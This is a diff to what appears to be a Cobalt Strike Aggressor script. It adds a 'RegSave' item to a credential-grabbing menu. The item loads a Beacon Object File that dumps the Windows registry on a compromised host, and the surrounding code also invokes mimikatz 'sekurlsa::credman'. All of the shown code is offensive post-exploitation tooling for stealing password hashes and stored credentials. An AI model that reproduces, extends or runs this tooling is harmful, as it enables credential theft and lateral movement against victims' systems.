@@ -118,7 +118,15 @@ menu "密码抓取" {
         }
       }
 }
-
+ separator();
+ item "RegSave(通过BOF形式dump注册表)" {
+   	$dialog = dialog("RegSave", %( bid => $1["@"] , Path => "C:\\temp\\" , arch => "x64" ) ,&RegSave);
+		dialog_description($dialog,"dump注册表的Bof实现,参考https://github.com/EncodeGroup/BOF-RegSave");
+		drow_text($dialog,"Path","Dump路径:");
+    drow_combobox($dialog,"arch","Arch:",@("x64","x86"));
+		dbutton_action($dialog,"Exploit");
+		dialog_show($dialog);
+ }
 separator();
 
   menu "探测wifi密码" {
@@ -446,4 +454,16 @@ sub credman{
 
 bmimikatz($1, "sekurlsa::credman");
 
+}
+
+sub RegSave{
+  $bid = $3["bid"];
+  $path = $3["Path"];
+  $arch = $3["arch"];
+
+  $args = bof_pack($bid,"z",$path);
+  $handle = openf(script_resource("./modules/HashCat/RegSave/regdump. $+ $arch $+ .o"));
+  $data = readb($handle,-1);
+  closef($handle);
+  beacon_inline_execute($bid,$data,"go",$args);
 }
